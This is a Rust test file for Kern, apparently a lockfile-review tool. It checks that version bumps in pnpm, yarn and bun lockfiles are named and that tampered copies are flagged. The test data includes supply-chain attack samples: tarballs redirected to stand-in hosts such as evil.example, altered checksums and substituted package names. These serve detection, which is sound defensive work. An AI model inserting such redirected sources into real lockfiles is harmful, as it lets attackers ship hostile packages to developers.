use kern::receipt;
use kern::util::*;
use serde_json::{Value, json};
use std::path::{Path, PathBuf};
use std::process::Command;

struct Temp(PathBuf);
impl Temp {
    fn new() -> Temp {
        let p = std::env::temp_dir().join(format!("kern-lock-{}", uuid4().unwrap()));
        std::fs::create_dir_all(&p).unwrap();
        Temp(p)
    }
}
impl Drop for Temp {
    fn drop(&mut self) { let _ = std::fs::remove_dir_all(&self.0); }
}

fn git(dir: &Path, args: &[&str]) -> String {
    let out = Command::new("git").args(args).current_dir(dir).env("GIT_AUTHOR_NAME", "t").env("GIT_AUTHOR_EMAIL", "t@t").env("GIT_COMMITTER_NAME", "t")
        .env("GIT_COMMITTER_EMAIL", "t@t").env("GIT_CONFIG_NOSYSTEM", "1").output().unwrap();
    assert!(out.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&out.stderr));
    String::from_utf8_lossy(&out.stdout).trim().to_string()
}
fn write(dir: &Path, path: &str, text: &str) {
    let p = dir.join(path);
    std::fs::create_dir_all(p.parent().unwrap()).unwrap();
    std::fs::write(p, text).unwrap();
}
fn rules_for(base: &[(&str, &str)], head: &[(&str, &str)]) -> Value {
    let t = Temp::new();
    let r = t.0.join("repo");
    std::fs::create_dir_all(&r).unwrap();
    git(&r, &["init", "-q", "-b", "main"]);
    git(&r, &["config", "core.autocrlf", "false"]);
    for (p, text) in base { write(&r, p, text); }
    git(&r, &["add", "-A"]);
    git(&r, &["commit", "-q", "--allow-empty", "-m", "base"]);
    let b = git(&r, &["rev-parse", "HEAD"]);
    for (p, text) in head { write(&r, p, text); }
    git(&r, &["add", "-A"]);
    git(&r, &["commit", "-q", "-m", "change"]);
    let h = git(&r, &["rev-parse", "HEAD"]);
    kern::rules::rules(&r, &b, &h).unwrap()
}
fn receipt_of(rules: &Value) -> Value {
    let d = json!({ "base": "1".repeat(40), "head": "2".repeat(40), "skipped": [], "unmeasured": [] });
    let tests = json!({ "status": "RAN", "runner": "vitest", "before": { "passed": 1, "failed": 0, "skipped": 0 }, "after": { "passed": 1, "failed": 0, "skipped": 0 }, "kept": 1,
        "broke": [], "flaky": [], "gone": [], "newly_skipped": [], "added": [], "already_failing": [], "new_problems": [] });
    receipt::build(&d, rules, &tests)
}
fn kinds(r: &Value, list: &str) -> Vec<String> { r[list].as_array().unwrap().iter().map(|x| x["kind"].as_str().unwrap().to_string()).collect() }
fn whys(rules: &Value) -> Vec<String> { rules["lockfile"].as_array().unwrap().iter().map(|x| x["why"].as_str().unwrap().to_string()).collect() }
fn unread(rules: &Value) -> Vec<String> { rules["not_checked"].as_array().unwrap().iter().map(|x| x["path"].as_str().unwrap().to_string()).collect() }
fn note(r: &Value) -> String { r["notes"].as_array().unwrap().iter().filter(|n| n["kind"] == "dependencies").map(|n| n["what"].as_str().unwrap().to_string()).collect() }
fn read(path: &str, text: &str) -> Result<kern::lock::Lock, String> { kern::lock::read(path, Some(text.as_bytes())) }

const MANIFEST: &str = r#"{"name":"app","scripts":{"test":"vitest run"},"devDependencies":{"vitest":"3.2.0"}}"#;

const LAGO_HEAD: &str = "lockfileVersion: '9.0'

settings:
  autoInstallPeers: true
  excludeLinksFromLockfile: false

overrides:
  uuid: '>=14.0.0'
  tmp: '>=0.2.6'

importers:

  .:
    dependencies:
      '@radix-ui/react-slot':
        specifier: 1.5.0
        version: 1.5.0(@types/react@18.3.31)(react@18.3.1)

packages:

  '@radix-ui/react-slot@1.5.0':
    resolution: {integrity: sha512-tyYd9ddPXAysAbdbD9eYxgwpCSv6f3PncqVSNKQFSR5lcJVLz3cb/pANDoYrLiHBpXv7skortyUgGUWsYuPPFQ==}
    peerDependencies:
      '@types/react': '*'
      react: ^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc
    peerDependenciesMeta:
      '@types/react':
        optional: true

  '@repeaterjs/repeater@3.0.6':
    resolution: {integrity: sha512-Javneu5lsuhwNCryN+pXH93VPQ8g0dBX7wItHFgYiwQmzE1sVdg5tWHiOgHywzL2W21XQopa7IwIEnNbmeUJYA==}

snapshots:

  '@radix-ui/react-slot@1.5.0(@types/react@18.3.31)(react@18.3.1)':
    dependencies:
      '@radix-ui/react-compose-refs': 1.1.5(@types/react@18.3.31)(react@18.3.1)
      react: 18.3.1
    optionalDependencies:
      '@types/react': 18.3.31

  '@repeaterjs/repeater@3.0.6': {}
";
fn lago_base() -> String {
    LAGO_HEAD.replace("specifier: 1.5.0\n        version: 1.5.0(", "specifier: 1.3.3\n        version: 1.3.3(").replace("'@radix-ui/react-slot@1.5.0", "'@radix-ui/react-slot@1.3.3")
        .replace("sha512-tyYd9ddPXAysAbdbD9eYxgwpCSv6f3PncqVSNKQFSR5lcJVLz3cb/pANDoYrLiHBpXv7skortyUgGUWsYuPPFQ==", "sha512-qx7oqnYbxnK9kYI9m317qmFmEgo6ywqWvbTogdj7cL9p3/yx4M48p7Rnw5z3H890cL/ow/EeWJsuTykeZVXP5Q==")
}
const GERRIT_GIT: &str = "
  highlightjs-ttcn3@git+https://gitea.osmocom.org/ttcn3/highlightjs-ttcn3.git#6daccff309fca1e7561a43984d42fa4f829ce06d:
    resolution: {commit: 6daccff309fca1e7561a43984d42fa4f829ce06d, repo: https://gitea.osmocom.org/ttcn3/highlightjs-ttcn3.git, type: git}
    version: 0.0.1
";

#[test]
fn getlago_lago_front_4449_a_pnpm_version_bump_is_a_named_note_and_no_longer_listed_as_not_checked() {
    let rules = rules_for(&[("package.json", MANIFEST), ("pnpm-lock.yaml", &lago_base())], &[("pnpm-lock.yaml", LAGO_HEAD)]);
    assert_eq!((unread(&rules), whys(&rules)), (Vec::<String>::new(), Vec::<String>::new()), "Kern reads pnpm-lock.yaml now: {rules}");
    let r = receipt_of(&rules);
    assert_eq!((r["decision"].as_str(), kinds(&r, "look")), (Some("clear"), vec![]), "{r}");
    assert!(note(&r).contains("@radix-ui/react-slot 1.3.3 → 1.5.0"), "the move is named, where before the receipt said only that pnpm-lock.yaml changed: {}", note(&r));
}

#[test]
fn a_hostile_copy_of_lago_front_4449_that_swaps_a_tarball_changes_a_checksum_or_adds_a_git_source_needs_a_look() {
    let base = [("package.json", MANIFEST), ("pnpm-lock.yaml", &lago_base() as &str)];
    let integrity = "{integrity: sha512-Javneu5lsuhwNCryN+pXH93VPQ8g0dBX7wItHFgYiwQmzE1sVdg5tWHiOgHywzL2W21XQopa7IwIEnNbmeUJYA==}";
    let swapped = LAGO_HEAD.replace(integrity, "{integrity: sha512-Javneu5lsuhwNCryN+pXH93VPQ8g0dBX7wItHFgYiwQmzE1sVdg5tWHiOgHywzL2W21XQopa7IwIEnNbmeUJYA==, tarball: https://evil.example/repeater-3.0.6.tgz}");
    let resummed = LAGO_HEAD.replace(integrity, "{integrity: sha512-qx7oqnYbxnK9kYI9m317qmFmEgo6ywqWvbTogdj7cL9p3/yx4M48p7Rnw5z3H890cL/ow/EeWJsuTykeZVXP5Q==}");
    let git = LAGO_HEAD.replace("\nsnapshots:", &format!("{GERRIT_GIT}\nsnapshots:"));
    let renamed = LAGO_HEAD.replace("version: 1.5.0(@types/react@18.3.31)(react@18.3.1)\n\npackages:", "version: '@repeaterjs/repeater@3.0.6'\n\npackages:");
    for (what, head, says) in [
        ("a tarball swapped to another host", swapped.as_str(), "@repeaterjs/repeater 3.0.6 downloads from https://evil.example/repeater-3.0.6.tgz, which is not its own registry tarball"),
        ("a checksum changed with no version move", resummed.as_str(), "@repeaterjs/repeater 3.0.6 has a new checksum without a new version"),
        ("a new git source", git.as_str(), "highlightjs-ttcn3 0.0.1 downloads from https://gitea.osmocom.org/ttcn3/highlightjs-ttcn3.git#6daccff309fca1e7561a43984d42fa4f829ce06d"),
        ("a direct dependency resolved to another package", renamed.as_str(), "node_modules/@radix-ui/react-slot installs another package: @repeaterjs/repeater in place of @radix-ui/react-slot"),
    ] {
        let rules = rules_for(&base, &[("pnpm-lock.yaml", head)]);
        assert!(whys(&rules).iter().any(|w| w.contains(says)), "{what}: {}", rules["lockfile"]);
        assert_eq!(kinds(&receipt_of(&rules), "look"), ["lockfile"], "{what}");
    }
}

const BOX_BASE: &str = "# THIS IS AN AUTOGENERATED FILE. DO NOT EDIT THIS FILE DIRECTLY.
# yarn lockfile v1


JSONStream@^1.3.5:
  version \"1.3.5\"
  resolved \"https://registry.yarnpkg.com/JSONStream/-/JSONStream-1.3.5.tgz#3208c1f08d3a4d99261ab64f92302bc15e111ca0\"
  integrity sha512-E+iruNOY8VV9s4JEbe1aNEm6MiszPRr/UfcHMz0TQh1BXSxHK+ASV1R6W4HpjBhSeS+54PIsAMCBmwD06LLsqQ==
  dependencies:
    jsonparse \"^1.2.0\"
    through \">=2.2.7 <3\"

mkdirp@^1.0.3, mkdirp@^1.0.4:
  version \"1.0.4\"
  resolved \"https://registry.yarnpkg.com/mkdirp/-/mkdirp-1.0.4.tgz#3eb5ed62622756d79a5f0e2a221dfebad75c2f7e\"
  integrity sha512-vVqVZQyf3WLx2Shd0qJ9xuvqgAyKPLAiqITEtqW0oIUjzo3PePDd6fW9iFz30ef7Ysp/oiWqbhszeGWW2T6Gzw==

moment@>=2.29.2:
  version \"2.30.1\"
  resolved \"https://registry.yarnpkg.com/moment/-/moment-2.30.1.tgz#f8c91c07b7a786e30c59926df530b4eac96974ae\"
  integrity sha512-uEmtNhbDOrWPFS+hdjFCBfy9f2YoyzRpwcl+DqpC6taX21FzsTLQVbMV/W7PzNSX6x/bhC1zA3c2UQ5NzH6how==
";
fn box_head() -> String {
    BOX_BASE.replace("version \"2.30.1\"", "version \"2.31.0\"").replace("moment-2.30.1.tgz#f8c91c07b7a786e30c59926df530b4eac96974ae", "moment-2.31.0.tgz#6e19184e8005a9dfc61c9351263d4d6ea2ace7aa")
        .replace("sha512-uEmtNhbDOrWPFS+hdjFCBfy9f2YoyzRpwcl+DqpC6taX21FzsTLQVbMV/W7PzNSX6x/bhC1zA3c2UQ5NzH6how==", "sha512-0acOTfMiWOheYS4eoWb80yYMb/JLvVv9SHbs2PehaDzfUG0Bw855SKyk0IKTnPGa5+U2bmi3W68l1+sGLX/pvw==")
}

#[test]
fn box_ui_elements_4876_a_yarn_classic_bump_names_moment_and_hostile_copies_need_a_look() {
    let base = [("package.json", MANIFEST), ("yarn.lock", BOX_BASE)];
    let rules = rules_for(&base, &[("yarn.lock", &box_head())]);
    assert_eq!((unread(&rules), whys(&rules)), (Vec::<String>::new(), Vec::<String>::new()), "{rules}");
    let r = receipt_of(&rules);
    assert_eq!(r["decision"], "clear", "{r}");
    assert!(note(&r).contains("moment 2.30.1 → 2.31.0"), "{}", note(&r));
    let mkdirp = "https://registry.yarnpkg.com/mkdirp/-/mkdirp-1.0.4.tgz#3eb5ed62622756d79a5f0e2a221dfebad75c2f7e";
    let git = "\n\"my-package@git+https://git@github.com/my-org/my-package.git#v1.8.3\":\n  version \"1.8.3\"\n  resolved \"git+https://git@github.com/my-org/my-package.git#b3bd3f1b3dad036e671251f5258beaae398f983a\"\n";
    for (what, head, says) in [
        ("a tarball on another host in the registry's layout", BOX_BASE.replace(mkdirp, "https://npm.evil.example/mkdirp/-/mkdirp-1.0.4.tgz#3eb5ed62622756d79a5f0e2a221dfebad75c2f7e"), "1 package now download from npm.evil.example"),
        ("a tarball swapped", BOX_BASE.replace(mkdirp, "https://evil.example/mkdirp.tgz"), "mkdirp 1.0.4 downloads from https://evil.example/mkdirp.tgz"),
        ("a checksum changed with no version move", BOX_BASE.replace("sha512-vVqVZQyf3WLx2Shd0qJ9xuvqgAyKPLAiqITEtqW0oIUjzo3PePDd6fW9iFz30ef7Ysp/oiWqbhszeGWW2T6Gzw==", "sha512-0acOTfMiWOheYS4eoWb80yYMb/JLvVv9SHbs2PehaDzfUG0Bw855SKyk0IKTnPGa5+U2bmi3W68l1+sGLX/pvw=="), "mkdirp 1.0.4 has a new checksum without a new version"),
        ("a new git source", format!("{BOX_BASE}{git}"), "my-package 1.8.3 downloads from git+https://git@github.com/my-org/my-package.git#b3bd3f1b3dad036e671251f5258beaae398f983a"),
    ] {
        let rules = rules_for(&base, &[("yarn.lock", &head)]);
        assert!(whys(&rules).iter().any(|w| w.contains(says)), "{what}: {}", rules["lockfile"]);
        assert_eq!(kinds(&receipt_of(&rules), "look"), ["lockfile"], "{what}");
    }
    let fresh = rules_for(&[("package.json", MANIFEST)], &[("yarn.lock", BOX_BASE)]);
    assert!(whys(&fresh).is_empty(), "JSONStream is a legacy name with capitals, and its registry tarball is its own: {}", fresh["lockfile"]);
}

const TLDRAW_BASE: &str = "# This file is generated by running \"yarn install\" inside your project.
# Manual changes might be lost - proceed with caution!

__metadata:
  version: 10
  cacheKey: 10

\"@babel/compat-data@npm:^7.28.6\":
  version: 7.29.0
  resolution: \"@babel/compat-data@npm:7.29.0\"
  checksum: 10/7f21beedb930ed8fbf7eabafc60e6e6521c1d905646bf1317a61b2163339157fe797efeb85962bf55136e166b01fd1a6b526a15974b92a8b877d564dcb6c9580
  languageName: node
  linkType: hard

\"tldraw@workspace:*, tldraw@workspace:packages/tldraw\":
  version: 0.0.0-use.local
  resolution: \"tldraw@workspace:packages/tldraw\"
  dependencies:
    \"@babel/compat-data\": \"npm:^7.28.6\"
  languageName: unknown
  linkType: soft

\"typescript@npm:5, typescript@npm:^5.0.4, typescript@npm:^5.6.0, typescript@npm:^5.8.3, typescript@npm:typescript@5.9.3\":
  version: 5.9.3
  resolution: \"typescript@npm:5.9.3\"
  bin:
    tsc: bin/tsc
    tsserver: bin/tsserver
  checksum: 10/c089d9d3da2729fd4ac517f9b0e0485914c4b3c26f80dc0cffcb5de1719a17951e92425d55db59515c1a7ddab65808466debb864d0d56dcf43f27007d0709594
  languageName: node
  linkType: hard

\"typescript@patch:typescript@npm%3A5#optional!builtin<compat/typescript>\":
  version: 5.9.3
  resolution: \"typescript@patch:typescript@npm%3A5.9.3#optional!builtin<compat/typescript>::version=5.9.3&hash=5786d5\"
  bin:
    tsc: bin/tsc
    tsserver: bin/tsserver
  checksum: 10/696e1b017bc2635f4e0c94eb4435357701008e2f272f553d06e35b494b8ddc60aa221145e286c28ace0c89ee32827a28c2040e3a69bdc108b1a5dc8fb40b72e3
  languageName: node
  linkType: hard
";
fn tldraw_head() -> String {
    TLDRAW_BASE.replace("\"@babel/compat-data@npm:^7.28.6\":\n  version: 7.29.0\n  resolution: \"@babel/compat-data@npm:7.29.0\"\n  checksum: 10/7f21beedb930ed8fbf7eabafc60e6e6521c1d905646bf1317a61b2163339157fe797efeb85962bf55136e166b01fd1a6b526a15974b92a8b877d564dcb6c9580",
        "\"@babel/compat-data@npm:^7.29.7\":\n  version: 7.29.7\n  resolution: \"@babel/compat-data@npm:7.29.7\"\n  checksum: 10/ad2272714087f68970977f6e2b53597a8503fc9c3028c4a91686474bd77a707dd00903cdde4b73788972016d1bad4dc3fa4e5ff38e1ed8f1c3bde1095352973a")
        .replace("\"@babel/compat-data\": \"npm:^7.28.6\"", "\"@babel/compat-data\": \"npm:^7.29.7\"")
}

#[test]
fn tldraw_10014_a_yarn_berry_bump_names_babel_and_hostile_copies_need_a_look() {
    let base = [("package.json", MANIFEST), ("yarn.lock", TLDRAW_BASE)];
    let rules = rules_for(&base, &[("yarn.lock", &tldraw_head())]);
    assert_eq!((unread(&rules), whys(&rules)), (Vec::<String>::new(), Vec::<String>::new()), "{rules}");
    assert!(note(&receipt_of(&rules)).contains("@babel/compat-data 7.29.0 → 7.29.7"), "{}", note(&receipt_of(&rules)));
    let git = "\n\"my-node-sdk@git+https://github.com/my-org/my-node-sdk.git#v1.1.0\":\n  version: 1.1.0\n  resolution: \"my-node-sdk@https://github.com/my-org/my-node-sdk.git#commit=053dea9e0b8af442d8f867c8e690d2fb0ceb1bf5\"\n  checksum: 0c5f2734e71e8284d97e2c3dd89c366c8e1603b0934006aed6b4a6247f1448033e8a71aff5c67c9b96307b76e911cbac9961d9865f760013c4f0b27e3906f1c4\n  languageName: node\n  linkType: hard\n";
    for (what, head, says) in [
        ("a checksum changed with no version move", TLDRAW_BASE.replace("10/c089d9d3da2729fd4ac517f9b0e0485914c4b3c26f80dc0cffcb5de1719a17951e92425d55db59515c1a7ddab65808466debb864d0d56dcf43f27007d0709594", "10/0c5f2734e71e8284d97e2c3dd89c366c8e1603b0934006aed6b4a6247f1448033e8a71aff5c67c9b96307b76e911cbac9961d9865f760013c4f0b27e3906f1c4"), "typescript 5.9.3 has a new checksum without a new version"),
        ("a new git source", format!("{TLDRAW_BASE}{git}"), "my-node-sdk 1.1.0 downloads from https://github.com/my-org/my-node-sdk.git#commit=053dea9e0b8af442d8f867c8e690d2fb0ceb1bf5"),
        ("a descriptor resolved to another package", TLDRAW_BASE.replace("resolution: \"@babel/compat-data@npm:7.29.0\"", "resolution: \"evil-data@npm:7.29.0\""), "@babel/compat-data@npm:^7.28.6 installs another package: evil-data in place of @babel/compat-data"),
    ] {
        let rules = rules_for(&base, &[("yarn.lock", &head)]);
        assert!(whys(&rules).iter().any(|w| w.contains(says)), "{what}: {}", rules["lockfile"]);
        assert_eq!(kinds(&receipt_of(&rules), "look"), ["lockfile"], "{what}");
    }
    let cache_moved = TLDRAW_BASE.replace("cacheKey: 10\n", "cacheKey: 10c0\n").replace("checksum: 10/7f21", "checksum: 10c0/9f21").replace("checksum: 10/c089", "checksum: 10c0/d089").replace("checksum: 10/696e", "checksum: 10c0/796e");
    assert!(whys(&rules_for(&base, &[("yarn.lock", &cache_moved)])).is_empty(), "a new cache key gives every checksum a new form; none of them can be compared with the old");
    let one_moved = TLDRAW_BASE.replace("checksum: 10/c089", "checksum: 10c0/d089");
    assert!(whys(&rules_for(&base, &[("yarn.lock", &one_moved)])).iter().any(|w| w.contains("typescript 5.9.3 lost its checksum without a new version")),
        "yarn ignores a checksum made under another cache key, so one entry moved to another key is a checksum dropped");
}

const BUN2NIX_GIT_DEPS: &str = r#"{
  "lockfileVersion": 1,
  "configVersion": 0,
  "workspaces": {
    "": {
      "name": "examples",
      "dependencies": {
        "zod": "https://registry.npmjs.org/zod/-/zod-3.21.4.tgz",
      },
      "devDependencies": {
        "@types/bun": "latest",
      },
    },
  },
  "packages": {
    "@types/bun": ["@types/bun@1.3.2", "", { "dependencies": { "bun-types": "1.3.2" } }, "sha512-t15P7k5UIgHKkxwnMNkJbWlh/617rkDGEdSsDbu+qNHTaz9SKf7aC8fiIlUdD5RPpH6GEkP0cK7WlvmrEBRtWg=="],

    "@types/node": ["@types/node@22.13.5", "", { "dependencies": { "undici-types": "~6.20.0" } }, "sha512-+lTU0PxZXn0Dr1NBtC7Y8cR21AJr87dLLU953CWA6pMxxv/UDc7jYAY90upcrie1nRcD6XNG5HOYEDtgW5TxAg=="],

    "csstype": ["csstype@3.2.3", "", {}, "sha512-z1HGKcYy2xA8AGQfwrn0PAy+PB7X/GSj3UVJW9qKyn43xWa+gl5nXmU4qqLMRzWVLFC8KusUX8T/0kCiOYpAIQ=="],

    "undici-types": ["undici-types@6.20.0", "", {}, "sha512-Ny6QZ2Nju20vw1SRHe3d9jVu6gJ+4e3+MMpqu7pqE5HT6WsTSlce++GQmK5UXS8mzV8DSYHrQH+Xrf2jVcuKNg=="],

    "zod": ["zod@https://registry.npmjs.org/zod/-/zod-3.21.4.tgz", {}],
  }
}
"#;

#[test]
fn nix_community_bun2nix_a_bun_lock_bump_is_a_named_note_and_hostile_copies_need_a_look() {
    let base = [("package.json", MANIFEST), ("bun.lock", BUN2NIX_GIT_DEPS)];
    let bumped = BUN2NIX_GIT_DEPS.replace("[\"undici-types@6.20.0\", \"\", {}, \"sha512-Ny6QZ2Nju20vw1SRHe3d9jVu6gJ+4e3+MMpqu7pqE5HT6WsTSlce++GQmK5UXS8mzV8DSYHrQH+Xrf2jVcuKNg==\"]",
        "[\"undici-types@6.21.0\", \"\", {}, \"sha512-iwDZqg0QAGrg9Rav5H4n0M64c3mkR59cJ6wQp+7C4nI0gsmExaedaYLNO44eT4AtBBwjbTiGPMlt2Md0T9H9JQ==\"]");
    let rules = rules_for(&base, &[("bun.lock", &bumped)]);
    assert_eq!((unread(&rules), whys(&rules)), (Vec::<String>::new(), Vec::<String>::new()), "zod's registry tarball is its own, and trailing commas are Bun's own JSON: {rules}");
    assert!(note(&receipt_of(&rules)).contains("undici-types 6.20.0 → 6.21.0"), "{}", note(&receipt_of(&rules)));
    let dayjs = "\n    \"dayjs\": [\"dayjs@github:iamkun/dayjs#45bf6a3\", {}, \"iamkun-dayjs-45bf6a3\"],\n";
    for (what, head, says) in [
        ("a tarball swapped", BUN2NIX_GIT_DEPS.replace("[\"zod@https://registry.npmjs.org/zod/-/zod-3.21.4.tgz\"", "[\"zod@https://evil.example/zod-3.21.4.tgz\""), "zod downloads from https://evil.example/zod-3.21.4.tgz"),
        ("a checksum changed with no version move", BUN2NIX_GIT_DEPS.replace("sha512-z1HGKcYy2xA8AGQfwrn0PAy+PB7X/GSj3UVJW9qKyn43xWa+gl5nXmU4qqLMRzWVLFC8KusUX8T/0kCiOYpAIQ==", "sha512-M1uQkMl8rQK/szD0LNhtqxIPLpimGm8sOBwU7lLnCpSbTyY3yeU1Vc7l4KT5zT4s/yOxHH5O7tIuuLOCnLADRw=="), "csstype 3.2.3 has a new checksum without a new version"),
        ("a new git source", BUN2NIX_GIT_DEPS.replace("\n\n    \"undici-types\"", &format!("{dayjs}\n    \"undici-types\"")), "dayjs downloads from github:iamkun/dayjs#45bf6a3"),
        ("a package path resolved to another package", BUN2NIX_GIT_DEPS.replace("[\"csstype@3.2.3\"", "[\"evil-type@3.2.3\""), "csstype installs another package: evil-type in place of csstype"),
    ] {
        let rules = rules_for(&base, &[("bun.lock", &head)]);
        assert!(whys(&rules).iter().any(|w| w.contains(says)), "{what}: {}", rules["lockfile"]);
        assert_eq!(kinds(&receipt_of(&rules), "look"), ["lockfile"], "{what}");
    }
    let twice = BUN2NIX_GIT_DEPS.replace("\"packages\": {", "\"packages\": {\n    \"csstype\": [\"csstype@3.2.3\", \"https://evil.example/csstype-3.2.3.tgz\", {}, \"sha512-z1HGKcYy2xA8AGQfwrn0PAy+PB7X/GSj3UVJW9qKyn43xWa+gl5nXmU4qqLMRzWVLFC8KusUX8T/0kCiOYpAIQ==\"],");
    assert!(read("bun.lock", &twice).unwrap_err().contains("twice"), "Bun keeps the first of two equal keys and serde_json the last, so a lockfile that names one twice is not read at all");
}

const MARUHI_BASE: &str = r#"{
  "lockfileVersion": 3,
  "configVersion": 1,
  "workspaces": {
    "": {
      "name": "maruhi",
      "devDependencies": {
        "vitest": "4.1.11",
      },
    },
  },
  "overrides": {
    "@scalar/json-magic": {
      "undici": "7.29.1",
    },
    "@types/node": "26.6.2",
  },
  "packages": {
    "blake3-wasm": ["blake3-wasm@2.1.5", "", {}, "sha512-F1+K8EbfOZE49dtoPtmxUQrpXaBIl3ICvasLh+nJta0xkz+9kF/7uet9fLnwKqhDrmj6g+6K3Tw9yQPUg2ka5g=="],

    "zod": ["zod@4.4.3", "", {}, "sha512-ytENFjIJFl2UwYglde2jchW2Hwm4GJFLDiSXWdTrJQBIN9Fcyp7n4DhxJEiWNAJMV1/BqWfW/kkg71UDcHJyTQ=="],
  }
}
"#;

#[test]
fn maruhiapp_maruhi_239_a_bun_lock_of_format_3_is_read_and_names_the_package_it_adds() {
    let cf = "\n    \"cf\": [\"cf@1.0.0-beta.5\", \"\", { \"dependencies\": { \"blake3-wasm\": \"2.1.5\", \"zod\": \"4.4.3\" }, \"bin\": { \"cf\": \"bin/cf\", \"cloudflare\": \"bin/cf\" } }, \"sha512-IKGKDAQNs8hbu7jOt3qSWKxDjmJTS+hcHCJ5B0IkF7gZ3RmEfMTUxZ0Fi7GRftjag04J127u8Nk8uppXx3OBZw==\"],\n";
    let head = MARUHI_BASE.replace("\n\n    \"zod\"", &format!("{cf}\n    \"zod\"")).replace("\"@types/node\": \"26.6.2\",", "\"@types/node\": \"26.6.2\",\n    \"miniflare\": {\n      \"undici\": \"7.29.1\",\n    },");
    let rules = rules_for(&[("package.json", MANIFEST), ("bun.lock", MARUHI_BASE)], &[("bun.lock", &head)]);
    assert_eq!((unread(&rules), whys(&rules)), (Vec::<String>::new(), Vec::<String>::new()), "Bun 1.3 writes format 3, whose packages read as format 1's do: {rules}");
    assert!(note(&receipt_of(&rules)).contains("cf 1.0.0-beta.5 (new)"), "{}", note(&receipt_of(&rules)));
}

const VUEJS_CORE_HEAD: &str = "---
lockfileVersion: '9.0'

importers:

  .:
    configDependencies: {}
    packageManagerDependencies:
      pnpm:
        specifier: 12.4.2
        version: 12.4.2

packages:

  '@pnpm/exe.linux-x64@12.4.2':
    resolution: {integrity: sha512-E255MbcQ0V1577M2BV0ajWuP7KmTPYA0jqZnk3rK6Lq3kTvZWulMMb7iqRmnLsQbyWTkMEB2CfyM70loVDA8xg==}
    cpu: [x64]
    os: [linux]

snapshots:

  '@pnpm/exe.linux-x64@12.4.2':
    optional: true

---
lockfileVersion: '9.0'

settings:
  autoInstallPeers: true
  excludeLinksFromLockfile: false

importers:

  .:
    devDependencies:
      vitest:
        specifier: 3.2.0
        version: 3.2.0

packages:

  vitest@3.2.0:
    resolution: {integrity: sha512-qx7oqnYbxnK9kYI9m317qmFmEgo6ywqWvbTogdj7cL9p3/yx4M48p7Rnw5z3H890cL/ow/EeWJsuTykeZVXP5Q==}
    hasBin: true

snapshots:

  vitest@3.2.0: {}
";

#[test]
fn emberjs_ember_js_21250_a_patched_dependency_is_steered_by_package_json_in_bun_as_in_pnpm_and_the_lockfile_names_no_move() {
    let manifest = |patches: &str| format!(r#"{{"name":"app","scripts":{{"test":"vitest run"}},"devDependencies":{{"vitest":"3.2.0"}}{patches}}}"#);
    let rules = rules_for(&[("package.json", &manifest("")), ("bun.lock", BUN2NIX_GIT_DEPS)],
        &[("package.json", &manifest(r#","patchedDependencies":{"csstype@3.2.3":"patches/csstype@3.2.3.patch"}"#)), ("bun.lock", &BUN2NIX_GIT_DEPS.replace("  \"packages\": {", "  \"patchedDependencies\": {\n    \"csstype@3.2.3\": \"patches/csstype@3.2.3.patch\",\n  },\n  \"packages\": {"))]);
    assert_eq!(rules["dependencies"].as_array().unwrap().iter().map(|d| (d["path"].as_str().unwrap(), d["fields"].clone())).collect::<Vec<_>>(), [("package.json", json!(["patchedDependencies"]))],
        "Bun applies the patch at install, which is what pnpm's own field does, and the lockfile moves no version: {}", rules["dependencies"]);
    assert_eq!(kinds(&receipt_of(&rules), "look"), ["install"]);
}

#[test]
fn vuejs_core_15585_the_document_that_installs_pnpm_itself_is_read_and_checked_too() {
    let lock = read("pnpm-lock.yaml", VUEJS_CORE_HEAD).unwrap();
    let names: Vec<String> = lock.packages().iter().map(|p| format!("{}@{}", p.name, p.version)).collect();
    assert_eq!(names, ["@pnpm/exe.linux-x64@12.4.2", "vitest@3.2.0"], "pnpm 10 and later write the package manager's own install first, as a document of its own");
    let swapped = VUEJS_CORE_HEAD.replace("{integrity: sha512-E255", "{tarball: https://evil.example/pnpm.tgz, integrity: sha512-E255");
    let rules = rules_for(&[("package.json", MANIFEST), ("pnpm-lock.yaml", VUEJS_CORE_HEAD)], &[("pnpm-lock.yaml", &swapped)]);
    assert!(whys(&rules).iter().any(|w| w.contains("@pnpm/exe.linux-x64 12.4.2 downloads from https://evil.example/pnpm.tgz")), "the binary that runs every install is a package too: {}", rules["lockfile"]);
}

#[test]
fn stage1_review_r3_a_lockfile_kern_cannot_read_after_the_change_is_not_verified_never_clear_and_never_a_look() {
    let anchored = LAGO_HEAD.replace("  tmp: '>=0.2.6'", "  tmp: &floor '>=0.2.6'\n  rimraf: *floor");
    let rules = rules_for(&[("package.json", MANIFEST), ("pnpm-lock.yaml", LAGO_HEAD)], &[("pnpm-lock.yaml", &anchored)]);
    assert_eq!((unread(&rules), whys(&rules)), (vec!["pnpm-lock.yaml".to_string()], vec![]), "{rules}");
    let r = receipt_of(&rules);
    assert_eq!((r["decision"].as_str(), kinds(&r, "look"), kinds(&r, "unverified")), (Some("unverified"), vec![], vec!["not-checked-install".to_string()]),
        "what Kern could not check is not verified, never a look and never green: {r}");
    assert!(r["unverified"][0]["what"].as_str().unwrap().starts_with("`pnpm-lock.yaml`: Kern could read this lockfile before the change but not after it (line 9 is not in the form pnpm writes)"), "{}", r["unverified"]);
    assert_eq!(r["not_checked"], json!([]), "the file is named once, where it decides the answer");
    let binary = rules_for(&[("package.json", MANIFEST), ("bun.lockb", "\u{0}bun-lockfile-format-v0\n")], &[("bun.lockb", "\u{0}bun-lockfile-format-v0\n\u{1}")]);
    assert_eq!((unread(&binary), whys(&binary)), (vec!["bun.lockb".to_string()], vec![]), "{binary}");
    let r = receipt_of(&binary);
    assert_eq!((r["decision"].as_str(), kinds(&r, "unverified")), (Some("unverified"), vec!["not-checked-install".to_string()]), "Bun's binary lockfile decides what gets installed and Kern cannot read it: {r}");
    assert!(r["unverified"][0]["what"].as_str().unwrap().contains("it is in Bun's binary format"), "{}", r["unverified"]);
    assert!(kern::lock::read("yarn.lock", None).unwrap_err().contains("larger than 64 MiB"), "a lockfile over the cap is not read, never guessed");
}

#[test]
fn langfuse_langfuse_18974_a_cargo_lock_kern_does_not_read_is_not_verified_never_clear() {
    let lock = |v: &str| format!("version = 4\n\n[[package]]\nname = \"tokio\"\nversion = \"{v}\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n");
    let rules = rules_for(&[("package.json", MANIFEST), ("ai-gateway/Cargo.lock", &lock("1.47.1"))], &[("ai-gateway/Cargo.lock", &lock("1.48.0"))]);
    let r = receipt_of(&rules);
    assert_eq!((r["decision"].as_str(), kinds(&r, "unverified")), (Some("unverified"), vec!["not-checked-install".to_string()]),
        "Kern does not read Cargo.lock, so a change to it is not verified, never a green with a line under it: {r}");
